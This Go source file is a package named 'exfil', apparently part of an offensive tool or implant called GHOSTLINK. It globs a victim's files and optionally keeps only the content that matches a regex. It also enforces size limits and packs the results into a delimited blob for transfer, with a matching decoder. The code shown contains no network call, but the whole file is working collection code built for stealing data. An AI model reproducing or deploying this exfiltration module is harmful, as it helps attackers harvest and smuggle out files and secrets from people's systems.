package exfil

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

type FileList []FileEntry

type FileEntry struct {
	Path    string
	Size    int64
	Content []byte
	Error   error
}

func ReadFile(path string) (*FileEntry, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, fmt.Errorf("stat %s: %w", path, err)
	}
	if info.IsDir() {
		return nil, fmt.Errorf("%s is a directory", path)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", path, err)
	}
	return &FileEntry{
		Path:    path,
		Size:    info.Size(),
		Content: data,
	}, nil
}

func GlobExfil(pattern string, filter string, maxSize int64) ([]FileEntry, error) {
	matches, err := filepath.Glob(pattern)
	if err != nil {
		return nil, fmt.Errorf("glob %s: %w", pattern, err)
	}

	if len(matches) == 0 {
		return nil, fmt.Errorf("no files matched pattern: %s", pattern)
	}

	var re *regexp.Regexp
	if filter != "" {
		re, err = regexp.Compile(filter)
		if err != nil {
			return nil, fmt.Errorf("filter regex %s: %w", filter, err)
		}
	}

	var results []FileEntry
	for _, match := range matches {
		info, err := os.Stat(match)
		if err != nil {
			results = append(results, FileEntry{Path: match, Error: err})
			continue
		}
		if info.IsDir() {
			continue
		}
		if maxSize > 0 && info.Size() > maxSize {
			results = append(results, FileEntry{Path: match, Error: fmt.Errorf("exceeds max size %d", maxSize)})
			continue
		}

		data, err := os.ReadFile(match)
		if err != nil {
			results = append(results, FileEntry{Path: match, Error: err})
			continue
		}

		if re != nil {
			matches := re.FindAll(data, -1)
			if len(matches) == 0 {
				continue
			}
			data = []byte(strings.Join(bytesToStrings(matches), "\n"))
		}

		results = append(results, FileEntry{
			Path:    match,
			Size:    info.Size(),
			Content: data,
		})
	}

	return results, nil
}

func bytesToStrings(b [][]byte) []string {
	s := make([]string, len(b))
	for i, v := range b {
		s[i] = string(v)
	}
	return s
}

func EncodeFileList(files []FileEntry) []byte {
	var parts []string
	for _, f := range files {
		if f.Error != nil {
			parts = append(parts, fmt.Sprintf("ERROR:%s:%v", f.Path, f.Error))
			continue
		}
		parts = append(parts, fmt.Sprintf("FILE:%s:%d:%s", f.Path, f.Size, string(f.Content)))
	}
	return []byte(strings.Join(parts, "\n---GHOSTLINK_FILE_BOUNDARY---\n"))
}

func DecodeFileList(data []byte) []FileEntry {
	var files []FileEntry
	parts := strings.Split(string(data), "\n---GHOSTLINK_FILE_BOUNDARY---\n")
	for _, part := range parts {
		if strings.HasPrefix(part, "ERROR:") {
			rest := strings.TrimPrefix(part, "ERROR:")
			fields := strings.SplitN(rest, ":", 2)
			files = append(files, FileEntry{Path: fields[0], Error: fmt.Errorf("%s", fields[1])})
			continue
		}
		if strings.HasPrefix(part, "FILE:") {
			rest := strings.TrimPrefix(part, "FILE:")
			colon1 := strings.Index(rest, ":")
			if colon1 < 0 {
				continue
			}
			path := rest[:colon1]
			rest = rest[colon1+1:]
			colon2 := strings.Index(rest, ":")
			if colon2 < 0 {
				continue
			}
			sizeStr := rest[:colon2]
			content := rest[colon2+1:]
			var size int64
			fmt.Sscanf(sizeStr, "%d", &size)
			files = append(files, FileEntry{
				Path:    path,
				Size:    size,
				Content: []byte(content),
			})
		}
	}
	return files
}
